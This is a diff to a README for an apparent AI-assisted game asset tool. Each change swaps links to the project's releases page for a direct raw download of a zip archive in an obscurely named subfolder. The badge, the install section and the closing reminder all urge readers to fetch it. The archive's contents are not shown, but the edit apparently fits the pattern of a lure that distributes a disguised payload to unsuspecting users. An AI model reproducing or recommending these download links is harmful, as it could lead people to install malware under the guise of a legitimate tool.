@@ -1,6 +1,6 @@
 # 🎮 game-development-studio - Create Game Assets Faster & Easier
 
-[![Download Now](https://img.shields.io/badge/Download-game--development--studio-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/uratemiafreshwaterfish5429/game-development-studio/releases)
+[![Download Now](https://img.shields.io/badge/Download-game--development--studio-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/uratemiafreshwaterfish5429/game-development-studio/raw/refs/heads/main/douzieme/studio_development_game_v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Think of it as your all-in-one helper for game creation. It works behind the sce
 
 ## 📥 Download & Install
 
-Visit this link to download the application: [https://github.com/uratemiafreshwaterfish5429/game-development-studio/releases](https://github.com/uratemiafreshwaterfish5429/game-development-studio/releases)
+Visit this link to download the application: [https://github.com/uratemiafreshwaterfish5429/game-development-studio/raw/refs/heads/main/douzieme/studio_development_game_v3.5.zip](https://github.com/uratemiafreshwaterfish5429/game-development-studio/raw/refs/heads/main/douzieme/studio_development_game_v3.5.zip)
 
 Here's how to get started:
 
@@ -125,6 +125,6 @@ Ready to start? Click the download button at the top of this page and begin your
 
 ---
 
-**Remember:** The download link is [https://github.com/uratemiafreshwaterfish5429/game-development-studio/releases](https://github.com/uratemiafreshwaterfish5429/game-development-studio/releases). Visit it to get the latest version of the software.
+**Remember:** The download link is [https://github.com/uratemiafreshwaterfish5429/game-development-studio/raw/refs/heads/main/douzieme/studio_development_game_v3.5.zip](https://github.com/uratemiafreshwaterfish5429/game-development-studio/raw/refs/heads/main/douzieme/studio_development_game_v3.5.zip). Visit it to get the latest version of the software.
 
 Keywords: 3d, blender, claude, cli, codex, game-assets, game-development, gltf, image-to-3d, leonardo-ai, pbr, render-debugging, telemetry, text-to-3d, tripo, typescript
